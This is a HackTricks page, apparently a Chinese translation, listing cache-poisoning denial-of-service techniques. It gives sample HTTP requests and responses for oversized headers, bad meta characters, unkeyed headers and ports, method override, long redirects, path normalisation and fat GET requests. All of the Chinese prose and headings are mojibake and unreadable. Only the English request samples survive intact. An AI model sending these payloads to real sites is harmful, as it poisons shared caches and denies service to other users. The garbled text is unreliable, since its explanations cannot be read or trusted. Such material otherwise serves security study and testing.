# ç¼“å­˜æŠ•æ¯’å¯¼è‡´æ‹’ç»æœåŠ¡æ”»å‡»

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

{% hint style="danger" %}
åœ¨æ­¤é¡µé¢ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸åŒçš„å˜ä½“ï¼Œå°è¯•ä½¿**WebæœåŠ¡å™¨ä»¥é”™è¯¯å“åº”**å¯¹**é€‚ç”¨äºç¼“å­˜æœåŠ¡å™¨**çš„è¯·æ±‚è¿›è¡Œå“åº”
{% endhint %}

* **HTTPæ ‡å¤´è¶…å¤§ï¼ˆHHOï¼‰**

å‘é€ä¸€ä¸ªå¸¦æœ‰æ¯”WebæœåŠ¡å™¨æ”¯æŒçš„æ ‡å¤´å¤§å°æ›´å¤§ä½†æ¯”ç¼“å­˜æœåŠ¡å™¨æ”¯æŒçš„æ ‡å¤´å¤§å°æ›´å°çš„è¯·æ±‚ã€‚WebæœåŠ¡å™¨å°†ä»¥400å“åº”è¿›è¡Œå“åº”ï¼Œè¯¥å“åº”å¯èƒ½ä¼šè¢«ç¼“å­˜ï¼š
```
GET / HTTP/1.1
Host: redacted.com
X-Oversize-Hedear:Big-Value-000000000000000
```
* **HTTP Meta Character (HMC) & Unexpected values**

å‘é€ä¸€ä¸ªåŒ…å«ä¸€äº›**æœ‰å®³çš„å…ƒå­—ç¬¦**ï¼Œå¦‚`\n`å’Œ`\r`çš„æ ‡å¤´ã€‚ä¸ºäº†ä½¿æ”»å‡»ç”Ÿæ•ˆï¼Œæ‚¨å¿…é¡»é¦–å…ˆç»•è¿‡ç¼“å­˜ã€‚
```
GET / HTTP/1.1
Host: redacted.com
X-Meta-Hedear:Bad Chars\n \r
```
ä¸€ä¸ªç³Ÿç³•é…ç½®çš„æ ‡å¤´å¯èƒ½åªæ˜¯`\:`ä½œä¸ºä¸€ä¸ªæ ‡å¤´ã€‚

å¦‚æœå‘é€äº†æ„å¤–çš„å€¼ï¼Œæ¯”å¦‚æ„å¤–çš„Content-Type:ï¼Œè¿™ä¹Ÿå¯èƒ½èµ·ä½œç”¨ã€‚
```
GET /anas/repos HTTP/2
Host: redacted.com
Content-Type: HelloWorld
```
* **æœªåŠ å¯†çš„æ ‡å¤´**

ä¸€äº›ç½‘ç«™ä¼šåœ¨è¯·æ±‚ä¸­çœ‹åˆ°ç‰¹å®šçš„æ ‡å¤´æ—¶è¿”å›é”™è¯¯çŠ¶æ€ç ï¼Œæ¯”å¦‚ _X-Amz-Website-Location-Redirect: someThing_ æ ‡å¤´ï¼š
```
GET /app.js HTTP/2
Host: redacted.com
X-Amz-Website-Location-Redirect: someThing

HTTP/2 403 Forbidden
Cache: hit

Invalid Header
```
* **HTTPæ–¹æ³•è¦†ç›–æ”»å‡»ï¼ˆHMOï¼‰**

å¦‚æœæœåŠ¡å™¨æ”¯æŒä½¿ç”¨è¯¸å¦‚ `X-HTTP-Method-Override`ã€`X-HTTP-Method` æˆ– `X-Method-Override` ç­‰æ ‡å¤´æ›´æ”¹HTTPæ–¹æ³•ã€‚å¯ä»¥è¯·æ±‚ä¸€ä¸ªæœ‰æ•ˆé¡µé¢å¹¶æ›´æ”¹æ–¹æ³•ï¼Œä»¥ä¾¿æœåŠ¡å™¨ä¸æ”¯æŒè¯¥æ–¹æ³•ï¼Œä»è€Œå¯¼è‡´ç¼“å­˜äº†é”™è¯¯çš„å“åº”ï¼š
```
GET /blogs HTTP/1.1
Host: redacted.com
HTTP-Method-Override: POST
```
* **æœªåŠ å¯†ç«¯å£**

å¦‚æœä¸»æœºå¤´ä¸­çš„ç«¯å£åœ¨å“åº”ä¸­åå°„ï¼Œä½†æœªåŒ…å«åœ¨ç¼“å­˜é”®ä¸­ï¼Œåˆ™å¯èƒ½å°†å…¶é‡å®šå‘åˆ°æœªä½¿ç”¨çš„ç«¯å£ï¼š
```
GET /index.html HTTP/1.1
Host: redacted.com:1

HTTP/1.1 301 Moved Permanently
Location: https://redacted.com:1/en/index.html
Cache: miss
```
* **é•¿é‡å®šå‘æ‹’ç»æœåŠ¡æ”»å‡»**

å°±åƒä¸‹é¢çš„ä¾‹å­ä¸€æ ·ï¼Œx æ²¡æœ‰è¢«ç¼“å­˜ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥æ»¥ç”¨é‡å®šå‘å“åº”è¡Œä¸ºï¼Œä½¿é‡å®šå‘å‘é€ä¸€ä¸ªå¦‚æ­¤åºå¤§çš„ URL ä»¥è‡³äºè¿”å›é”™è¯¯ã€‚ç„¶åï¼Œå°è¯•è®¿é—®æ²¡æœ‰ç¼“å­˜çš„ x é”®çš„ URL çš„äººå°†æ”¶åˆ°é”™è¯¯å“åº”ï¼š
```
GET /login?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 301 Moved Permanently
Location: /login/?x=veryLongUrl
Cache: hit

GET /login/?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 414 Request-URI Too Large
CF-Cache-Status: miss
```
* **ä¸»æœºå¤´å¤§å°å†™è§„èŒƒåŒ–**

ä¸»æœºå¤´åº”è¯¥æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œä½†ä¸€äº›ç½‘ç«™å¸Œæœ›å®ƒæ˜¯å°å†™çš„ï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™ä¼šè¿”å›é”™è¯¯ï¼š
```
GET /img.png HTTP/1.1
Host: Cdn.redacted.com

HTTP/1.1 404 Not Found
Cache:miss

Not Found
```
* **è·¯å¾„è§„èŒƒåŒ–**

æŸäº›é¡µé¢ä¼šè¿”å›é”™è¯¯ä»£ç ï¼Œå°†æ•°æ®ä»¥ URLencode çš„æ–¹å¼å‘é€åˆ°è·¯å¾„ä¸­ï¼Œç„¶è€Œï¼Œç¼“å­˜æœåŠ¡å™¨ä¼šå¯¹è·¯å¾„è¿›è¡Œ URLdecode å¤„ç†ï¼Œå¹¶å°†å“åº”å­˜å‚¨ä¸º URLdecoded è·¯å¾„ï¼š
```
GET /api/v1%2e1/user HTTP/1.1
Host: redacted.com


HTTP/1.1 404 Not Found
Cach:miss

Not Found
```
* **Fat Get**

ä¸€äº›ç¼“å­˜æœåŠ¡å™¨ï¼Œæ¯”å¦‚Cloudflareï¼Œæˆ–è€…WebæœåŠ¡å™¨ï¼Œä¼šé˜»æ­¢å¸¦æœ‰ä¸»ä½“çš„GETè¯·æ±‚ï¼Œå› æ­¤è¿™å¯èƒ½è¢«æ»¥ç”¨æ¥ç¼“å­˜ä¸€ä¸ªæ— æ•ˆçš„å“åº”ï¼š
```
GET /index.html HTTP/2
Host: redacted.com
Content-Length: 3

xyz


HTTP/2 403 Forbidden
Cache: hit
```
## å‚è€ƒèµ„æ–™

* [https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52](https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52)
* [https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------](https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
